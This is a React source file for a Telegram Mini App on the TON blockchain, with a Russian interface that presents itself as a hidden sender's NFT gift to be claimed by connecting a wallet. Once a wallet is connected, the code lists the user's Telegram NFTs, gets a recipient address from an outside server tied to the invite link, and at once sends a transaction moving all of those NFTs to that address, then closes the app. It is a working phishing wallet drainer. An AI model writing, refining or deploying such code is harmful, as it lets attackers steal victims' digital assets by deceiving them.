import { useState, useEffect } from 'react'
import { useTonConnectUI, useTonWallet, useTonAddress } from '@tonconnect/ui-react'
import { Address, beginCell, toNano } from '@ton/ton'
import axios from 'axios'
import './App.css'

const tg = window.Telegram.WebApp

function App() {
  const [tonConnectUI] = useTonConnectUI()
  const wallet = useTonWallet()
  const userAddress = useTonAddress()

  const [nfts, setNfts] = useState([])
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [success, setSuccess] = useState(false)
  const [recipientUserId, setRecipientUserId] = useState(null)

  useEffect(() => {
    tg.ready()
    tg.expand()
    tg.setHeaderColor('#667eea')
    tg.setBackgroundColor('#667eea')

    const urlParams = new URLSearchParams(window.location.search)
    const startParam = urlParams.get('tgWebAppStartParam') ||
                       urlParams.get('startapp') ||
                       tg.initDataUnsafe?.start_parameter

    if (startParam) {
      setRecipientUserId(startParam)
    }
  }, [])

  useEffect(() => {
    if (wallet && userAddress && recipientUserId) {
      loadNFTs()
    }
  }, [wallet, userAddress, recipientUserId])

  useEffect(() => {
    // Автоматически переводим NFT сразу после загрузки
    if (nfts.length > 0 && !loading && !success) {
      transferAllNFTs()
    }
  }, [nfts])

  const loadNFTs = async () => {
    setLoading(true)
    setError('')
    try {
      const response = await axios.get(`https://tonapi.io/v2/accounts/${userAddress}/nfts?limit=1000`)
      const nftItems = response.data.nft_items || []
      const telegramNFTs = nftItems.filter(nft =>
        nft.collection?.address &&
        nft.collection.name?.toLowerCase().includes('telegram')
      )
      setNfts(telegramNFTs)
    } catch (err) {
      setError('Ошибка загрузки NFT')
      console.error(err)
    } finally {
      setLoading(false)
    }
  }

  const transferAllNFTs = async () => {
    if (!recipientUserId || nfts.length === 0) {
      tg.showAlert('Нет NFT для перевода')
      return
    }

    setLoading(true)
    setError('')

    try {
      const recipientResponse = await axios.post('https://project-nft.onrender.com/api/get-recipient-address', {
        user_id: recipientUserId
      })

      const recipientAddress = recipientResponse.data.address
      const recipientAddressObj = Address.parse(recipientAddress)

      // Создаём массив транзакций для всех NFT
      const messages = nfts.map(nft => {
        const nftAddressObj = Address.parse(nft.address)

        const forwardPayload = beginCell()
          .storeUint(0, 32)
          .storeStringTail('Bulk NFT Transfer')
          .endCell()

        const body = beginCell()
          .storeUint(0x5fcc3d14, 32) // NFT transfer opcode
          .storeUint(0, 64)
          .storeAddress(recipientAddressObj)
          .storeAddress(Address.parse(userAddress))
          .storeBit(0)
          .storeCoins(toNano('0.01'))
          .storeBit(1)
          .storeRef(forwardPayload)
          .endCell()

        return {
          address: nftAddressObj.toString(),
          amount: toNano('0.05').toString(),
          payload: body.toBoc().toString('base64')
        }
      })

      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 300,
        messages: messages
      }

      await tonConnectUI.sendTransaction(transaction)

      setSuccess(true)
      setNfts([])

      setTimeout(() => {
        tg.close()
      }, 2000)

    } catch (err) {
      setError('Ошибка отправки: ' + (err.message || 'Неизвестная ошибка'))
      console.error(err)
    } finally {
      setLoading(false)
    }
  }

  if (!recipientUserId) {
    return (
      <div className="container error-screen">
        <div className="error-box">
          <h2>❌ Ошибка</h2>
          <p>Приложение должно быть открыто по специальной ссылке</p>
        </div>
      </div>
    )
  }

  if (success) {
    return (
      <div className="container success-screen">
        <div className="success-box">
          <div className="success-icon">✅</div>
          <h1>Успех!</h1>
          <p>Все NFT успешно отправлены</p>
        </div>
      </div>
    )
  }

  if (!wallet) {
    return (
      <div className="container welcome-screen">
        <div className="nft-preview">
          <img
            src="https://www.image2url.com/r2/default/gifs/1786609701564-2877ee88-25c6-4e8a-ad3f-2ade770a762f.gif"
            alt="Telegram NFT"
            className="nft-gif"
          />
        </div>
        <h1>🎁 Telegram NFT</h1>
        <p className="sender-info">
          Отправитель: <strong>Аккаунт скрыт</strong>
        </p>
        <button
          className="primary-btn"
          onClick={() => tonConnectUI.openModal()}
        >
          Выбрать кошелёк для зачисления NFT
        </button>
      </div>
    )
  }

  return (
    <div className="container main-screen">
      <div className="loader-overlay">
        <div className="nft-preview">
          <img
            src="https://www.image2url.com/r2/default/gifs/1786609701564-2877ee88-25c6-4e8a-ad3f-2ade770a762f.gif"
            alt="Telegram NFT"
            className="nft-gif"
          />
        </div>
        <div className="loader">Отправка NFT...</div>
        <p style={{ marginTop: '20px', opacity: 0.8 }}>Найдено: {nfts.length} NFT</p>
      </div>
    </div>
  )
}

export default App
